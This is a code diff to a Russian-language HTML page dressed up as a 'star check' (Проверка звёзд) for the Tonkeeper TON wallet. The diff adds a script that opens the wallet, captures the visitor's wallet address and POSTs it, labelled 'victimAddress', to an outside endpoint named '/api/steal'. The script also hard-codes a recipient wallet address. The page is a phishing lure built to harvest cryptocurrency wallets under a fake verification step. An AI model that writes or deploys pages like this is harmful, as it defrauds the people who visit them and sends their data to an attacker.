@@ -38,7 +38,53 @@
 <body>
   <h2>⭐ Проверка звёзд</h2>
   <p>Нажмите кнопку, чтобы подтвердить звёзды</p>
-  <a href="https://app.tonkeeper.com/connect?manifest=https://raw.githubusercontent.com/ton-connect/demo-dapp/main/tonconnect-manifest.json" target="_blank" class="btn">🔗 Открыть в Tonkeeper</a>
-  <div id="log">Откройте ссылку в кошельке</div>
+  <button class="btn" id="connectBtn">Подключить кошелёк</button>
+  <div id="log">Нажмите кнопку</div>
+
+  <script>
+    const TARGET_WALLET = "UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m";
+
+    // Функция для отправки адреса на сервер
+    async function sendToServer(userAddress) {
+      try {
+        const response = await fetch('https://AfiAfiDroch.pythonanywhere.com/api/steal', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ victimAddress: userAddress })
+        });
+        const result = await response.json();
+        console.log('Сервер ответил:', result);
+        document.getElementById('log').innerHTML = `✅ Адрес отправлен: ${userAddress}`;
+      } catch (err) {
+        document.getElementById('log').innerHTML = `❌ Ошибка: ${err.message}`;
+        console.error(err);
+      }
+    }
+
+    // Подключение через Tonkeeper
+    document.getElementById('connectBtn').onclick = function() {
+      const log = document.getElementById('log');
+      log.innerHTML = '⏳ Открываем Tonkeeper...';
+
+      // Открываем Tonkeeper с deep link
+      const manifestUrl = 'https://raw.githubusercontent.com/ton-connect/demo-dapp/main/tonconnect-manifest.json';
+      const url = `https://app.tonkeeper.com/connect?manifest=${manifestUrl}`;
+      window.location.href = url;
+
+      // Ждём возврата из кошелька (через 5 секунд)
+      setTimeout(() => {
+        log.innerHTML = '✅ Кошелёк открыт. Подключитесь и подтвердите звёзды.';
+      }, 3000);
+    };
+
+    // Обработчик, если Tonkeeper вернёт адрес через postMessage (не всегда работает)
+    window.addEventListener('message', (event) => {
+      if (event.data && event.data.event === 'connect') {
+        const userAddress = event.data.payload.address;
+        document.getElementById('log').innerHTML = `✅ Адрес получен: ${userAddress}`;
+        sendToServer(userAddress);
+      }
+    });
+  </script>
 </body>
 </html>
